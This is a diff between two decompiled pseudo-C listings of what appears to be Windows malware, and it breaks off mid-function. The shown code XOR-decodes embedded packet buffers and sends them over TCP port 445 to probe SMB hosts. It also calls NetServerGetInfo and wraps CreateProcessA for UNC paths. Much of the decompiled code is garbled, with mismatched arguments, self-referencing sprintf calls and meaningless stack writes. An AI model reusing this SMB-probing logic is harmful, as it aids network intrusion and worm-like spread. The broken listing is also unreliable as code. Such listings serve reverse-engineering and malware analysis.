+            int32_t v13 = 0; // edi
+            int32_t v14; // 0x404dcc
+            if (GetProcAddress((int32_t *)func, lpProcName) == NULL) {
                 // 0x404dc8
-                v9 = (int16_t *)"%sAddrErr]";
-                format2 = (int16_t *)"%sAddrErr]";
+                *(int32_t *)(g8 - 4) = (int32_t)&str;
+                v14 = g8 - 8;
+                *(int32_t *)v14 = (int32_t)"%sAddrErr]";
                 // branch -> 0x404dd1
             } else {
-                int32_t format = 0; // bp-588
-                *(int32_t *)&v4 = v1;
-                int32_t cbMultiByte = strlen((char *)str2) + 1; // 0x404c80
-                v4 = (int16_t *)cbMultiByte;
-                v7 = NULL;
-                *(int32_t *)&v7 = v1;
-                int16_t * lpWideCharStr = (int16_t *)&format; // 0x404c87
-                MultiByteToWideChar(CodePage, CodePage, (char *)str2, cbMultiByte, lpWideCharStr, (int32_t)(struct timeval *)512);
-                int32_t wstr = 0; // bp-1100
-                v4 = (int16_t *)&wstr;
-                swprintf((int16_t *)&wstr, (int32_t)L"%s", (int16_t *)&format);
-                v9 = (int16_t *)101;
-                v4 = (int16_t *)&wstr;
-                v7 = (int16_t *)0x404cb9;
-                __pseudo_call((int32_t)func);
-                format2 = (int16_t *)101;
+                // 0x404c68
+                int32_t v15; // bp-588
+                int32_t v16 = &v15; // 0x404c68
+                *(int32_t *)(g8 - 4) = 512;
+                *(int32_t *)(g8 - 8) = v16;
+                lpProcName = (char *)v13;
+                *(int32_t *)(g8 - 12) = cbMultiByte;
+                *(int32_t *)g8 = strlen(lpProcName) + 1;
+                *(int32_t *)(g8 - 4) = cbMultiByte;
+                *(int32_t *)(g8 - 8) = v13;
+                *(int32_t *)(g8 - 12) = v13;
+                MultiByteToWideChar((int32_t)lpProcName, dwFlags, NULL, cbMultiByte, (int16_t *)lpWideCharStr, (int32_t)&cchWideChar);
+                *(int32_t *)(g8 - 4) = v16;
+                *(int32_t *)(g8 - 8) = (int32_t)L"%s";
+                *(int32_t *)(g8 - 12) = v2;
+                swprintf((int16_t *)&cchWideChar, (int32_t)&cchWideChar, (int16_t *)&cchWideChar);
+                *(int32_t *)(g8 + 8) = (int32_t)&lpProcName;
+                *(int32_t *)(g8 + 4) = 101;
+                *(int32_t *)g8 = v2;
+                *(int32_t *)(g8 - 4) = (int32_t)&str;
+                int32_t v17 = g8 - 8; // 0x404dc1
+                *(int32_t *)v17 = (int32_t)"%sErr]";
+                v14 = v17;
                 // branch -> 0x404dd1
             }
             // 0x404dd1
-            v4 = (int16_t *)a2;
+            *(int32_t *)(v14 - 4) = lpWideCharStr;
+            int32_t chars_printed = sprintf((char *)&cchWideChar, (char *)&cchWideChar); // 0x404dd4
+            v12 = g8 + 12;
             // branch -> 0x404dd9
             // 0x404dd9
-            g5 = (int32_t)v7;
-            g6 = (int32_t)v4;
-            g3 = (int32_t)v9;
-            return sprintf(str3, (char *)format2);
+            g5 = *(int32_t *)v12;
+            g7 = *(int32_t *)(v12 + 4);
+            g3 = *(int32_t *)(v12 + 8);
+            g2 = dwFlags;
+            return chars_printed;
         }
         // 0x404c46
+        *(int32_t *)(g8 - 4) = (int32_t)&str;
+        int32_t v18 = g8 - 8; // 0x404c4a
+        *(int32_t *)v18 = (int32_t)"%sNetServerGetInfo";
         // branch -> 0x404dd1
         // 0x404dd1
-        v4 = (int16_t *)a2;
-        chars_printed = sprintf(str3, (char *)(int16_t *)"%sNetServerGetInfo");
-        v8 = (int16_t *)"%sNetServerGetInfo";
+        *(int32_t *)(v18 - 4) = lpWideCharStr;
+        chars_printed2 = sprintf((char *)&cchWideChar, (char *)&cchWideChar);
+        v12 = g8 + 12;
         // branch -> 0x404dd9
     } else {
         // 0x404c20
-        chars_printed = sprintf(str3, "%sLibErr]", v2);
-        v8 = (int16_t *)a2;
+        *(int32_t *)(g8 - 4) = (int32_t)"%sLibErr]";
+        *(int32_t *)(g8 - 8) = lpWideCharStr;
+        chars_printed2 = sprintf((char *)&cchWideChar, (char *)&cchWideChar);
+        v12 = g8 + 8;
         // branch -> 0x404dd9
     }
     // 0x404dd9
-    g5 = (int32_t)v7;
-    g6 = (int32_t)v4;
-    g3 = (int32_t)v8;
-    return chars_printed;
+    g5 = *(int32_t *)v12;
+    g7 = *(int32_t *)(v12 + 4);
+    g3 = *(int32_t *)(v12 + 8);
+    g2 = dwFlags;
+    return chars_printed2;
 }
 
-// Address range: 0x404dde - 0x404fd0
-int32_t function_404dde(int32_t a1, struct fd_set * str3) {
+// Address range: 0x404dde - 0x404fd1
+int32_t function_404dde(char * a1, int32_t a2) {
     struct in_addr in; // 0x404e6a
-    struct sockaddr * name = (struct sockaddr *)a1;
     int32_t v1 = g2; // bp-4
     g2 = &v1;
-    int32_t v2 = g3; // 0x404de7
-    int32_t v3 = g6; // 0x404de8
-    int32_t v4 = g5; // 0x404de9
-    int16_t * v5; // bp-200
-    int32_t v6 = (int32_t)&v5; // 0x404df2
-    _memcpy((char *)&v5, (char *)&g19, 34);
-    v5 = (int16_t *)(int32_t)*(int16_t *)&g19;
-    char * v7; // bp-372
-    int32_t v8 = (int32_t)&v7; // 0x404e04
-    _memcpy((char *)&v7, (char *)&g18, (int32_t)(struct timeval *)42);
-    v7 = (char *)(int32_t)*(char *)&g18;
-    int16_t * v9; // bp-596
-    int32_t v10 = (int32_t)&v9; // 0x404e15
-    int32_t v11 = 0; // eax
-    _memcpy((char *)&v9, (char *)&g17, (int32_t)(struct timeval *)55);
-    v9 = (int16_t *)(int32_t)*(int16_t *)&g17;
-    int32_t v12 = v10 | 2; // 0x404e1f
-    *(char *)v12 = *(char *)((int32_t)&g17 + 2);
-    char * v13 = (char *)(v11 - 196 + g2); // 0x404e22
-    *v13 = *v13 ^ -109;
-    int32_t v14 = v11 + 1; // 0x404e2a
+    char * str2 = (char *)42; // bp-872
+    int32_t v2; // bp-200
+    __asm_rep_movsd_memcpy((char *)&v2, (char *)&g20, 34);
+    str2 = (char *)55;
+    int32_t v3; // bp-372
+    __asm_rep_movsd_memcpy((char *)&v3, (char *)&g19, 42);
+    int32_t v4 = 0; // eax
+    int32_t v5; // bp-596
+    __asm_rep_movsd_memcpy((char *)&v5, (char *)&g18, 55);
+    char * v6 = (char *)(v4 - 196 + g2); // 0x404e22
+    *v6 = *v6 ^ -109;
+    int32_t v7 = v4 + 1; // 0x404e2a
     // branch -> 0x404e22
-    while (v14 < 137) {
+    while (v7 < 137) {
         // 0x404e22
-        v13 = (char *)(v14 - 196 + g2);
-        *v13 = *v13 ^ -109;
-        v14++;
+        v6 = (char *)(v7 - 196 + g2);
+        *v6 = *v6 ^ -109;
+        v7++;
         // continue -> 0x404e22
     }
-    char * v15 = (char *)(g2 - 368); // 0x404e34
-    *v15 = *v15 ^ -109;
-    int32_t v16 = 1; // 0x404e3c
+    // 0x404e32
+    int32_t nfds; // bp-856
+    int32_t v8 = &nfds; // 0x404de1
+    char * v9 = (char *)(g2 - 368); // 0x404e34
+    *v9 = *v9 ^ -109;
+    int32_t v10 = 1; // 0x404e3c
     // branch -> 0x404e34
-    while (v16 < 168) {
+    while (v10 < 168) {
         // 0x404e34
-        v15 = (char *)(v16 - 368 + g2);
-        *v15 = *v15 ^ -109;
-        v16++;
+        v9 = (char *)(v10 - 368 + g2);
+        *v9 = *v9 ^ -109;
+        v10++;
         // continue -> 0x404e34
     }
-    char * v17 = (char *)(g2 - 592); // 0x404e46
-    *v17 = *v17 ^ -109;
-    int32_t v18 = 1; // 0x404e4e
+    char * v11 = (char *)(g2 - 592); // 0x404e46
+    *v11 = *v11 ^ -109;
+    int32_t v12 = 1; // 0x404e4e
     // branch -> 0x404e46
-    while (v18 < 222) {
+    while (v12 < 222) {
         // 0x404e46
-        v17 = (char *)(v18 - 592 + g2);
-        *v17 = *v17 ^ -109;
-        v18++;
+        v11 = (char *)(v12 - 592 + g2);
+        *v11 = *v11 ^ -109;
+        v12++;
         // continue -> 0x404e46
     }
-    struct hostent * v19 = gethostbyname((char *)name); // 0x404e59
-    struct timeval * str2 = (struct timeval *)&g68;
-    if (v19 != NULL) {
-        int32_t v20 = *(int32_t *)((int32_t)v19 + 12); // 0x404e63
+    int32_t name = *(int32_t *)&a1; // 0x404e566
+    *(int32_t *)&str2 = name;
+    struct hostent * v13 = gethostbyname((char *)name); // 0x404e59
+    char * str; // bp-876
+    int32_t v14;
+    if (v13 == NULL) {
+        // 0x404e73
+        str = (char *)&g74;
+        v14 = (int32_t)&str;
+        // branch -> 0x404e78
+    } else {
+        int32_t v15 = *(int32_t *)((int32_t)v13 + 12); // 0x404e63
+        int32_t v16 = *(int32_t *)*(int32_t *)v15; // 0x404e68
+        str = (char *)v16;
         in = (struct in_addr){
             .e0 = 0
         };
-        in.e0 = *(int32_t *)*(int32_t *)v20;
-        str2 = (struct timeval *)inet_ntoa(in);
+        in.e0 = v16;
+        int32_t v17 = (int32_t)inet_ntoa(in); // bp-880
+        v14 = &v17;
         // branch -> 0x404e78
     }
     // 0x404e78
-    int32_t str; // bp-60
-    int32_t v21 = &str; // 0x404e78
-    strcpy((char *)&str, (char *)str2);
-    g4 = (int32_t)str2;
-    if ((char)str == 0) {
-        int32_t dest_str = (int32_t)strcpy((char *)str3, "[Can'tGetIP]"); // 0x404e91
+    char v18; // bp-60
+    int32_t v19 = &v18; // 0x404e78
+    *(int32_t *)(v14 - 4) = v19;
+    strcpy(str, str2);
+    int32_t * v20 = (int32_t *)g8; // 0x404e85
+    int32_t * v21 = (int32_t *)(g8 + 4); // 0x404e86
+    g4 = *v21;
+    int32_t v22; // 0x404fcc
+    if (v18 == 0) {
+        // 0x404e89
+        *v21 = (int32_t)"[Can'tGetIP]";
+        *v20 = a2;
+        int32_t dest_str = (int32_t)strcpy(str, str2); // 0x404e91
+        v22 = g8 + 8;
         // branch -> 0x404fcc
         // 0x404fcc
-        g5 = v4;
-        g6 = v3;
-        g3 = v2;
+        g5 = *(int32_t *)v22;
+        g7 = *(int32_t *)(v22 + 4);
+        g3 = *(int32_t *)(v22 + 8);
         g2 = v1;
         return dest_str;
     }
     // 0x404e9d
-    g5 = 1;
-    int32_t v22 = 2; // ebx
-    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x404ea7
-    g6 = sock_fd;
+    *v21 = 0;
+    *v20 = 1;
+    int32_t sock = 1; // edi
+    *v20 = 1;
+    int32_t * v23 = (int32_t *)(g8 - 4); // 0x404ea3
+    *v23 = 2;
+    int32_t v24 = 2; // ebx
+    *v23 = 2;
+    int32_t sock_fd = socket((int32_t)str, (int32_t)str2, g5); // 0x404ea7
+    g7 = sock_fd;
+    int32_t * str3;
     if (sock_fd == -1) {
-        int32_t chars_printed = sprintf((char *)*(int32_t *)&str3, "[%s:SOCKET_ERROR]", &str); // 0x404ec0
+        // 0x404eb4
+        *(int32_t *)(g8 - 4) = v19;
+        *(int32_t *)(g8 - 8) = (int32_t)"[%s:SOCKET_ERROR]";
+        *(int32_t *)(g8 - 12) = a2;
+        int32_t chars_printed = sprintf((char *)&str3, (char *)&str3); // 0x404ec0
+        v22 = g8 + 12;
         // branch -> 0x404fcc
         // 0x404fcc
-        g5 = v4;
-        g6 = v3;
-        g3 = v2;
+        g5 = *(int32_t *)v22;
+        g7 = *(int32_t *)(v22 + 4);
+        g3 = *(int32_t *)(v22 + 8);
         g2 = v1;
         return chars_printed;
     }
-    struct fd_set * addr = (struct fd_set *)v22; // bp-28
-    htons(445);
-    inet_addr((char *)&str);
-    int32_t v23; // bp-20
-    memset(&v23, 0, 8);
-    name = (struct sockaddr *)g5;
-    ioctlsocket(g6, -0x7ffb9982, (int32_t *)&name);
-    struct fd_set * timeout = (struct fd_set *)v22; // bp-12
-    struct sockaddr * writefds = (struct sockaddr *)g5; // bp-856
-    connect(g6, (struct sockaddr *)&addr, 16);
-    int32_t nfds = g6 + 1; // 0x404f3e
-    int32_t v24 = select(nfds, NULL, (struct fd_set *)&writefds, NULL, (struct timeval *)&timeout); // 0x404f44
+    // 0x404ece
+    *(int32_t *)(g8 - 4) = 445;
+    int16_t host_short = v24; // 0x404ed3
+    int16_t v25 = host_short; // bp-28
+    uint16_t cp = htons(host_short); // 0x404ed7
+    *(int32_t *)(g8 - 4) = v19;
+    int32_t v26 = inet_addr((char *)(int32_t)cp); // 0x404ee5
+    *(int32_t *)(g8 - 4) = 8;
+    *(int32_t *)(g8 - 8) = 0;
+    int32_t v27; // bp-20
+    *(int32_t *)(g8 - 12) = (int32_t)&v27;
+    memset((int32_t *)v26, v27, (int32_t)&str3);
+    int32_t v28 = (int32_t)&a1; // 0x404efe
+    a1 = (char *)sock;
+    *(int32_t *)(g8 + 8) = v28;
+    *(int32_t *)(g8 + 4) = -0x7ffb9982;
+    *(int32_t *)g8 = g7;
+    ioctlsocket((int32_t)a1, a2, &str3);
+    *(int32_t *)(g8 - 4) = 16;
+    *(int32_t *)(g8 - 8) = (int32_t)&v25;
+    *(int32_t *)(g8 - 12) = g7;
+    int32_t addr = g7; // 0x404f1f
+    nfds = sock;
+    connect(sock, (struct sockaddr *)addr, (int32_t)&str3);
+    *(int32_t *)(g8 - 4) = (int32_t)&v24;
+    *(int32_t *)(g8 - 8) = 0;
+    *(int32_t *)(g8 - 12) = v8;
+    *(int32_t *)(g8 - 16) = 0;
+    *(int32_t *)(g8 - 20) = g7 + 1;
+    int32_t v29 = select(nfds, (struct fd_set *)addr, (struct fd_set *)&str3, (struct fd_set *)&str3, (struct timeval *)&str3); // 0x404f44
     int32_t result; // 0x404fd0
-    if (v24 >= 1) {
-        int32_t v25 = (int32_t)str3; // 0x404f7a
-        if (function_404fd1((struct fd_set *)g6, v6, 137, v21, v25, g5) != 0) {
+    if (v29 >= 0 == (v29 != 0)) {
+        // 0x404f65
+        *(int32_t *)(g8 - 4) = sock;
+        *(int32_t *)(g8 - 8) = a2;
+        *(int32_t *)(g8 - 12) = v19;
+        *(int32_t *)(g8 - 16) = 137;
+        *(int32_t *)(g8 - 20) = (int32_t)&v2;
+        *(int32_t *)(g8 - 24) = g7;
+        if (function_404fd1() != 0) {
             // 0x404f86
-            if (function_404fd1((struct fd_set *)g6, v8, 168, v21, v25, g3) != 0) {
+            *(int32_t *)(g8 + 20) = g3;
+            *(int32_t *)(g8 + 16) = a2;
+            *(int32_t *)(g8 + 12) = v19;
+            *(int32_t *)(g8 + 8) = 168;
+            *(int32_t *)(g8 + 4) = (int32_t)&v3;
+            *(int32_t *)g8 = g7;
+            if (function_404fd1() != 0) {
                 // 0x404fa7
-                function_404fd1((struct fd_set *)g6, v10, 222, v21, v25, 3);
+                *(int32_t *)(g8 + 20) = 3;
+                *(int32_t *)(g8 + 16) = a2;
+                *(int32_t *)(g8 + 12) = v19;
+                *(int32_t *)(g8 + 8) = 222;
+                *(int32_t *)(g8 + 4) = (int32_t)&v5;
+                *(int32_t *)g8 = g7;
+                function_404fd1();
                 // branch -> 0x404fc5
                 // 0x404fc5
-                result = closesocket(g6);
+                *(int32_t *)(g8 + 20) = g7;
+                result = closesocket(nfds);
+                v22 = g8;
                 // branch -> 0x404fcc
             } else {
                 result = 0;
+                v22 = g8 + 24;
             }
         } else {
             result = 0;
+            v22 = g8 + 24;
         }
     } else {
         // 0x404f4e
-        sprintf((char *)*(int32_t *)&str3, "[%s:Unconnect]", &str);
+        *(int32_t *)(g8 - 4) = v19;
+        *(int32_t *)(g8 - 8) = (int32_t)"[%s:Unconnect]";
+        *(int32_t *)(g8 - 12) = a2;
+        sprintf((char *)&str3, (char *)&str3);
         // branch -> 0x404fc5
         // 0x404fc5
-        result = closesocket(g6);
+        *(int32_t *)(g8 + 8) = g7;
+        result = closesocket(nfds);
+        v22 = g8;
         // branch -> 0x404fcc
     }
     // 0x404fcc
-    g5 = v4;
-    g6 = v3;
-    g3 = v2;
+    g5 = *(int32_t *)v22;
+    g7 = *(int32_t *)(v22 + 4);
+    g3 = *(int32_t *)(v22 + 8);
     g2 = v1;
     return result;
 }
 
-// Address range: 0x404fd1 - 0x405119
-int32_t function_404fd1(struct fd_set * a1, int32_t a2, int32_t a3, int32_t a4, int32_t str, int32_t a6) {
-    int32_t v1 = 0; // edx
+// Address range: 0x404fd1 - 0x405103
+int32_t function_404fd1(void) {
+    // 0x404fd1
     g1 = 0x1120;
     function_405a10();
-    int32_t buf = (int32_t)a1; // 0x404fe0
-    int32_t timeout = g5; // bp-16
     int32_t sock = 1; // edi
-    struct fd_set * v2 = (struct fd_set *)1; // bp-8
-    ioctlsocket(buf, -0x7ffb9982, (int32_t *)&v2);
-    timeout = 2;
-    struct fd_set * writefds = (struct fd_set *)sock; // bp-292
-    struct fd_set * v3 = (struct fd_set *)buf; // bp-32
+    int32_t v1 = 1; // bp-8
+    int32_t v2;
+    ioctlsocket(v2, -0x7ffb9982, &v1);
+    int32_t v3 = 0; // bp-32
+    int32_t timeout = 2; // bp-16
+    int32_t buf = 0; // esi
+    int32_t writefds = sock; // bp-292
     int32_t * length;
     send(sock, (char *)buf, (int32_t)&length, (int32_t)&length);
     int32_t nfds = buf + 1; // 0x405025
-    g4 = (int32_t)&writefds;
-    v3 = NULL;
-    if (select(nfds, NULL, (struct fd_set *)&writefds, NULL, (struct timeval *)&timeout) < 1) {
-        // 0x4050ac
-        sprintf((char *)str, (char *)(struct fd_set *)"[%s:SendError]");
-        closesocket(buf);
-        // branch -> 0x4050fe
-        // 0x4050fe
-        g5 = timeout;
-        g6 = 0;
-        g3 = (int32_t)v2;
-        return 0;
-    }
-    // 0x405049
-    v2 = (struct fd_set *)sock;
-    ioctlsocket(buf, -0x7ffb9982, (int32_t *)&v2);
-    v3 = (struct fd_set *)&writefds;
-    timeout = 4;
-    writefds = (struct fd_set *)sock;
-    int32_t v4 = select(sock, (struct fd_set *)buf, (struct fd_set *)&length, (struct fd_set *)&length, (struct timeval *)&length); // 0x405081
-    if (v4 >= 1) {
-        // 0x40508b
-        v3 = (struct fd_set *)buf;
-        int32_t buf2; // bp-4388
-        if (recv(buf, (char *)&buf2, 1600, 0) != -1) {
-            // 0x4050c3
-            if (a6 == 3) {
-                // 0x4050c9
-                int32_t v5; // bp-4340
-                int32_t v6 = &v5; // 0x4050cb
-                g4 = v6;
-                unsigned char v7 = *(char *)v6; // 0x4050d1
-                v1 = v1 & -256 | (int32_t)v7;
-                *(char *)(g2 - 28) = v7;
-                int32_t v8 = 0; // 0x4050d7
-                int32_t v9 = v8 + 1; // 0x4050d7
-                int32_t v10 = g4 + 2; // 0x4050d9
-                g4 = v10;
-                // branch -> 0x4050d1
-                while (v9 < 12) {
-                    // 0x4050d1
-                    v7 = *(char *)v10;
-                    v1 = v1 & -256 | (int32_t)v7;
-                    *(char *)(v9 - 28 + g2) = v7;
-                    v8 = v9;
-                    v9 = v8 + 1;
-                    v10 = g4 + 2;
-                    g4 = v10;
-                    // continue -> 0x4050d1
+    g4 = &writefds;
+    int32_t v4 = select(nfds, NULL, (struct fd_set *)&writefds, NULL, (struct timeval *)&timeout); // 0x405035
+    int32_t v5; // 0x4050fe
+    if (v4 >= 0 == (v4 != 0)) {
+        // 0x405049
+        v1 = sock;
+        ioctlsocket(buf, -0x7ffb9982, &v1);
+        timeout = 4;
+        writefds = sock;
+        int32_t v6 = select(sock, (struct fd_set *)buf, (struct fd_set *)&length, (struct fd_set *)&length, (struct timeval *)&length); // 0x405081
+        if (v6 >= 1) {
+            // 0x40508b
+            int32_t buf2; // bp-4388
+            if (recv(buf, (char *)&buf2, 1600, 0) != -1) {
+                // 0x4050c3
+                int32_t v7;
+                if (v7 == 3) {
+                    // 0x4050c9
+                    int32_t v8; // bp-4340
+                    int32_t v9 = &v8; // 0x4050cb
+                    g4 = v9;
+                    unsigned char v10 = *(char *)v9; // 0x4050d1
+                    g6 = g6 & -256 | (int32_t)v10;
+                    *(char *)(g2 - 28) = v10;
+                    int32_t v11 = 0; // 0x4050d7
+                    int32_t v12 = v11 + 1; // 0x4050d7
+                    int32_t v13 = g4 + 2; // 0x4050d9
+                    g4 = v13;
+                    // branch -> 0x4050d1
+                    while (v12 < 12) {
+                        // 0x4050d1
+                        v10 = *(char *)v13;
+                        g6 = g6 & -256 | (int32_t)v10;
+                        *(char *)(v12 - 28 + g2) = v10;
+                        v11 = v12;
+                        v12 = v11 + 1;
+                        v13 = g4 + 2;
+                        g4 = v13;
+                        // continue -> 0x4050d1
+                    }
+                    // 0x4050df
+                    *(char *)(v11 - 27 + g2) = 0;
+                    int32_t str;
+                    int32_t v14;
+                    sprintf((char *)str, "[%s:%s]", (char *)v14, &v3);
+                    // branch -> 0x4050fc
                 }
-                // 0x4050df
-                *(char *)(v8 - 27 + g2) = 0;
-                v3 = (struct fd_set *)str;
-                sprintf((char *)str, "[%s:%s]", (struct fd_set *)a4, &v3);
-                // branch -> 0x4050fc
+                // 0x4050fc
+                // branch -> 0x4050fe
+                // 0x4050fe
+                v5 = g8;
+                g7 = *(int32_t *)(v5 + 4);
+                g3 = *(int32_t *)(v5 + 8);
+                return sock;
             }
-            // 0x4050fc
-            // branch -> 0x4050fe
-            // 0x4050fe
-            g5 = timeout;
-            g6 = 0;
-            g3 = (int32_t)v2;
-            return sock;
         }
+        // 0x4050a4
+        *(int32_t *)(g8 - 8) = (int32_t)"[%s:RcvError]";
+        // branch -> 0x4050ac
     }
     // 0x4050ac
-    sprintf((char *)str, (char *)(struct fd_set *)"[%s:RcvError]");
+    sprintf((char *)&length, (char *)&length);
+    *(int32_t *)(g8 + 8) = buf;
     closesocket(buf);
     // branch -> 0x4050fe
     // 0x4050fe
-    g5 = timeout;
-    g6 = 0;
-    g3 = (int32_t)v2;
+    v5 = g8;
+    g7 = *(int32_t *)(v5 + 4);
+    g3 = *(int32_t *)(v5 + 8);
     return 0;
 }
 
-// Address range: 0x40511a - 0x405907
-int32_t function_40511a(struct _STARTUPINFOA * str) {
-    struct _STARTUPINFOA * v1 = str;
-    int32_t v2 = g2; // 0x40511a
-    int32_t v3 = g5; // 0x405125
+// Address range: 0x405103 - 0x405119
+int32_t function_405103(void) {
+    // 0x405103
+    function_4015d4((char *)&g50, 0);
+    g4 = 0;
+    ExitProcess(1);
+    // UNREACHABLE
+}
+
+// Address range: 0x405119 - 0x40511a
+int32_t function_405119(void) {
+    // 0x405119
+    return 0;
+}
+
+// Address range: 0x40511a - 0x4051f5
+int32_t function_40511a(char * str) {
+    int32_t v1 = g2; // 0x40511a
     int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x40512b
-    int32_t func = (int32_t)GetProcAddress(moduleHandle, "SetCurrentDirectoryA"); // 0x405139
+    int32_t v2 = (int32_t)moduleHandle; // 0x40512b
+    GetProcAddress(moduleHandle, "SetCurrentDirectoryA");
+    int32_t v3 = v2; // bp-628
+    int32_t v4 = &v3; // 0x40513f
     FreeLibrary(moduleHandle);
-    int32_t lpCommandLine = (int32_t)str;
-    int32_t v4 = 0; // ebx
-    int32_t lpProcessInformation; // bp-20
-    int32_t lpStartupInfo; // bp-88
-    int32_t dwCreationFlags; // 0x4051e0
+    char * v5 = "\\\\"; // bp-632
+    int32_t v6 = (int32_t)&v5; // 0x405148
+    int32_t v7 = 0; // ebx
+    int32_t v8; // bp-20
+    int32_t v9; // bp-88
+    int32_t v10; // 0x4051be
+    int32_t v11; // 0x4051ca
+    int32_t v12; // 0x4051f0
     bool result; // 0x4051ea
-    char * lpApplicationName; // 0x4051e0
-    struct _SECURITY_ATTRIBUTES * lpProcessAttributes; // 0x4051e4
-    if (strstr((char *)str, "\\\\") != NULL) {
-        // 0x40511a
-        // branch -> 0x4051be
+    int32_t v13; // 0x4051c0
+    int32_t * lpProcessAttributes;
+    if (strstr(str, "\\\\") != NULL) {
+        v10 = v4;
         // 0x4051be
-        memset(&lpStartupInfo, 0, 68);
-        dwCreationFlags = v4;
-        lpApplicationName = (char *)dwCreationFlags;
-        lpProcessAttributes = (struct _SECURITY_ATTRIBUTES *)dwCreationFlags;
-        result = CreateProcessA(lpApplicationName, (char *)lpCommandLine, lpProcessAttributes, lpProcessAttributes, (dwCreationFlags & 1) != 0, dwCreationFlags, (int32_t *)dwCreationFlags, lpApplicationName, (struct _STARTUPINFOA *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation);
-        g5 = v3;
-        g2 = v2;
+        *(int32_t *)(v10 - 4) = 68;
+        v13 = &v9;
+        *(int32_t *)(v10 - 8) = v7;
+        *(int32_t *)(v10 - 12) = v13;
+        memset((int32_t *)v5, v3, v2);
+        v11 = g8;
+        *(int32_t *)(v11 + 8) = (int32_t)&v8;
+        *(int32_t *)(v11 + 4) = v13;
+        *(int32_t *)v11 = v7;
+        *(int32_t *)(v11 - 4) = v7;
+        *(int32_t *)(v11 - 8) = v7;
+        *(int32_t *)(v11 - 12) = v7;
+        *(int32_t *)(v11 - 16) = v7;
+        *(int32_t *)(v11 - 20) = v7;
+        *(int32_t *)(v11 - 24) = (int32_t)str;
+        *(int32_t *)(v11 - 28) = v7;
+        result = CreateProcessA((char *)1, (char *)(v7 & 0xffff), (struct _SECURITY_ATTRIBUTES *)&lpProcessAttributes, (struct _SECURITY_ATTRIBUTES *)&lpProcessAttributes, (bool)&lpProcessAttributes, (int32_t)&lpProcessAttributes, &lpProcessAttributes, (char *)&lpProcessAttributes, (struct _STARTUPINFOA *)&lpProcessAttributes, (struct _PROCESS_INFORMATION *)&lpProcessAttributes);
+        v12 = g8;
+        g5 = *(int32_t *)v12;
+        g7 = *(int32_t *)(v12 + 4);
+        g3 = *(int32_t *)(v12 + 8);
+        g2 = v1;
         return result;
     }
+    // 0x40515e
+    *(int32_t *)&v5 = (int32_t)str;
     int32_t str2 = 0; // bp-600
-    strcpy((char *)&str2, (char *)str);
+    strcpy((char *)&str2, str);
     int32_t found_char_pos = (int32_t)strchr((char *)&str2, 34); // 0x40517c
-    if (found_char_pos == v4) {
+    if (found_char_pos == v7) {
+        v10 = v4;
         // 0x4051be
-        memset(&lpStartupInfo, found_char_pos, 68);
-        dwCreationFlags = v4;
-        lpApplicationName = (char *)dwCreationFlags;
-        lpProcessAttributes = (struct _SECURITY_ATTRIBUTES *)dwCreationFlags;
-        result = CreateProcessA(lpApplicationName, (char *)lpCommandLine, lpProcessAttributes, lpProcessAttributes, (dwCreationFlags & 1) != 0, dwCreationFlags, (int32_t *)dwCreationFlags, lpApplicationName, (struct _STARTUPINFOA *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation);
-        g5 = v3;
-        g2 = v2;
+        *(int32_t *)(v10 - 4) = 68;
+        v13 = &v9;
+        *(int32_t *)(v10 - 8) = v7;
+        *(int32_t *)(v10 - 12) = v13;
+        memset((int32_t *)v5, v3, v2);
+        v11 = g8;
+        *(int32_t *)(v11 + 8) = (int32_t)&v8;
+        *(int32_t *)(v11 + 4) = v13;
+        *(int32_t *)v11 = v7;
+        *(int32_t *)(v11 - 4) = v7;
+        *(int32_t *)(v11 - 8) = v7;
+        *(int32_t *)(v11 - 12) = v7;
+        *(int32_t *)(v11 - 16) = v7;
+        *(int32_t *)(v11 - 20) = v7;
+        *(int32_t *)(v11 - 24) = (int32_t)str;
+        *(int32_t *)(v11 - 28) = v7;
+        result = CreateProcessA((char *)1, (char *)(v7 & 0xffff), (struct _SECURITY_ATTRIBUTES *)&lpProcessAttributes, (struct _SECURITY_ATTRIBUTES *)&lpProcessAttributes, (bool)&lpProcessAttributes, (int32_t)&lpProcessAttributes, &lpProcessAttributes, (char *)&lpProcessAttributes, (struct _STARTUPINFOA *)&lpProcessAttributes, (struct _PROCESS_INFORMATION *)&lpProcessAttributes);
+        v12 = g8;
+        g5 = *(int32_t *)v12;
+        g7 = *(int32_t *)(v12 + 4);
+        g3 = *(int32_t *)(v12 + 8);
+        g2 = v1;
         return result;
     }
+    // 0x405185
+    v5 = (char *)34;
     char * found_char_pos2 = strchr((char *)(found_char_pos + 1), 34); // 0x405189
-    int32_t v5 = (int32_t)found_char_pos2; // 0x405189
-    if (v5 == v4) {
+    if ((int32_t)found_char_pos2 == v7) {
+        v10 = v4;
         // 0x4051be
-        memset(&lpStartupInfo, v5, 68);
-        dwCreationFlags = v4;
-        lpApplicationName = (char *)dwCreationFlags;
-        lpProcessAttributes = (struct _SECURITY_ATTRIBUTES *)dwCreationFlags;
-        result = CreateProcessA(lpApplicationName, (char *)lpCommandLine, lpProcessAttributes, lpProcessAttributes, (dwCreationFlags & 1) != 0, dwCreationFlags, (int32_t *)dwCreationFlags, lpApplicationName, (struct _STARTUPINFOA *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation);
-        g5 = v3;
-        g2 = v2;
+        *(int32_t *)(v10 - 4) = 68;
+        v13 = &v9;
+        *(int32_t *)(v10 - 8) = v7;
+        *(int32_t *)(v10 - 12) = v13;
+        memset((int32_t *)v5, v3, v2);
+        v11 = g8;
+        *(int32_t *)(v11 + 8) = (int32_t)&v8;
+        *(int32_t *)(v11 + 4) = v13;
+        *(int32_t *)v11 = v7;
+        *(int32_t *)(v11 - 4) = v7;
+        *(int32_t *)(v11 - 8) = v7;
+        *(int32_t *)(v11 - 12) = v7;
+        *(int32_t *)(v11 - 16) = v7;
+        *(int32_t *)(v11 - 20) = v7;
+        *(int32_t *)(v11 - 24) = (int32_t)str;
+        *(int32_t *)(v11 - 28) = v7;
+        result = CreateProcessA((char *)1, (char *)(v7 & 0xffff), (struct _SECURITY_ATTRIBUTES *)&lpProcessAttributes, (struct _SECURITY_ATTRIBUTES *)&lpProcessAttributes, (bool)&lpProcessAttributes, (int32_t)&lpProcessAttributes, &lpProcessAttributes, (char *)&lpProcessAttributes, (struct _STARTUPINFOA *)&lpProcessAttributes, (struct _PROCESS_INFORMATION *)&lpProcessAttributes);
+        v12 = g8;
